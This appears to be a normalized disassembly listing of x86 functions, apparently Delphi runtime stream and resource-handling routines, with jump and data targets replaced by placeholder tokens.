mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2b8
call sub_403864
mov esp ebp
pop ebp
retn
sub_4159dc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_403038
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_415990
pop ecx
mov eax [ ebx ]
call sub_40307c
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_415990
pop ecx
sub_415a60
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_415ad0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
sub_415b08
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
sub_415b40
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_4158c4
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026cc
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_415c1c
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415c23
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4026ec
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_415ad0
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_415b08
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_415c34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_415c84
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4182ec
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415c8b
mov eax [ ebp - 0x8 ]
call sub_4030f0
retn
sub_415c94
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030c0
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_415cf0
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_4080bc
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_415d30
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40c654
pop ebx
pop ebp
retn 0x8
sub_415d58
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_415d9c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_415d9c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_415ec5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_4033fc
movzx edx di
mov eax esi
call sub_407fe0
mov ecx eax
xor edx edx
mov eax ebx
call sub_415c94
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_40805c
mov ecx eax
xor edx edx
mov eax ebx
call sub_415c94
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415ecc
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_403ed0
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4081b4
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40a9b8
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2b8
call sub_403864
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4081b4
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40a9b8
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2b8
call sub_403864
jmp r-xdata
sub_415ecc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_415ef0
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
call sub_4080f4
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_415f2c
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028c8
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_415f64
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_415f88
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax esi
call sub_415fb4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_415fcc
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_4158c4
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_415ad0
sub_416004
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_415f24
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_41602c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_416004
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_416058
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406798
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_40677c
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_40676c
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
test ecx ecx
jne r-xdata
sub_4160e4
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028c8
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_416004
sub_416134
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030c0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_40436c
mov ecx eax
mov edx esi
mov eax edi
call sub_4161fc
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_41618c
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4161ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1fc
call sub_403864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4161f6
lea eax [ ebp - 0xc ]
call sub_403eac
retn
sub_4161fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_41618c
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_415f24
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_41618c
pop ecx
sub_416268
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406768
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_4162b8
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026cc
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_416300
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4026ec
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_4163a8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_416404
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403f00
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403f00
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_41645c
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_403f9c
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_40440c
mov al 0x1
inc ebx
sub_4164b4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41652b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4054e8
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_410bc8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416532
lea eax [ ebp - 0x4 ]
call sub_4054e8
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_4104d8
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_4054e8
mov ecx eax
mov eax esi
pop edx
call sub_40cb48
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_4054e8
sub_416538
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4165de
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4165e5
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_403f9c
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_41a014
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407ab0
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_416600
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4138bc
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4138bc
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413704
sub_416638
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4138bc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4138bc
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_413750
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413704
sub_416680
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_416819
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_413c24
mov edi eax
xor edx edx
push ebp
push sub_4167fa
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416801
mov eax [ rw-data ]
call sub_413c88
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4167db
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_416789
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_413860
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_4133ac
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416790
mov eax [ ebp - 0x8 ]
call sub_4030f0
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_410604
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_416600
pop ecx
mov edx esi
mov eax edi
call sub_413750
mov eax ebx
call sub_4030f0
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_416538
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_416638
pop ecx
inc esi
sub_416790
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4030f0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_413860
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
sub_416828
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413c24
mov edi eax
xor eax eax
push ebp
push sub_4168c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413c88
retn
mov edx ebx
mov eax edi
call sub_413860
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_413750
mov eax esi
call sub_4030f0
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407ab0
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4168d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413c24
mov edi eax
xor eax eax
push ebp
push sub_41694b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413c88
retn
mov edx ebx
mov eax edi
call sub_413860
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_413750
mov eax esi
call sub_4030f0
sub_41697c
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2b8
call sub_403864
pop ecx
pop edx
pop ebx
retn
sub_4169c0
push ebx
push esi
push edi
call sub_403464
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416300
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_4169fc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4188d4
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_4189e4
call sub_416970
sub_416a20
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407ab0
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_403eac
sub_416a54
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407ab0
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4188d4
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_416b15
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_416e98
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_416e98
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416b1c
mov eax [ ebp - 0x8 ]
call sub_4030f0
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4189e4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_416970
sub_416b44
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_416b64
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_404148
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_40335c
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
